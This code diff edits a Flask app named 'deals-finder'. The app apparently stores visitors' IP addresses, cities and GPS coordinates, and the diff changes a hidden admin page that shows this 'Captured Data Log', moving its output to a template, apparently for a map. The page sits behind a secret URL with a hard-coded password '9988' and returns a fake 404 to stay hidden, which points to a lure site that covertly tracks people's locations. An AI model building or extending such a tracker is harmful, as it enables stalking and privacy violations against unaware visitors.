@@ -8,6 +8,7 @@ import sqlite3
 import os
 from datetime import datetime
 import requests
+import json
 
 app = Flask(__name__)
 app.secret_key = 'deals-finder-secret-key'
@@ -103,10 +104,10 @@ def get_stats():
     conn.close()
     return jsonify({'total': total, 'with_gps': with_gps, 'ip_only': total - with_gps})
 
+
 @app.route('/view_results_admin_<secret_key>')
 def view_results(secret_key):
-    MY_SECRET = "9988"  # This is your password
-    
+    MY_SECRET = "9988"
     if secret_key != MY_SECRET:
         return "404 Not Found", 404
 
@@ -118,18 +119,10 @@ def view_results(secret_key):
         rows = cursor.fetchall()
         conn.close()
 
-        html = """
-        <html><head><title>Admin Panel</title>
-        <style>body{font-family:sans-serif; padding:20px;} table{width:100%; border-collapse:collapse;} 
-        th,td{padding:8px; border:1px solid #333; text-align:left;} th{background:#eee;}</style>
-        </head><body>
-        <h2>Captured Data Log</h2>
-        <table><tr><th>ID</th><th>IP</th><th>City</th><th>Lat</th><th>Lon</th><th>Accuracy</th><th>Time</th></tr>
-        """
-        for row in rows:
-            html += f"<tr><td>{row['id']}</td><td>{row['ip_address']}</td><td>{row['detected_city']}</td><td>{row['gps_lat']}</td><td>{row['gps_lon']}</td><td>{row['gps_accuracy']}</td><td>{row['created_at']}</td></tr>"
+        # Convert rows to a list of dicts so we can pass them to JavaScript
+        locations_list = [dict(row) for row in rows]
         
-        return html + "</table></body></html>"
+        return render_template('admin.html', locations=locations_list)
     except Exception as e:
         return f"Database Error: {e}"
 
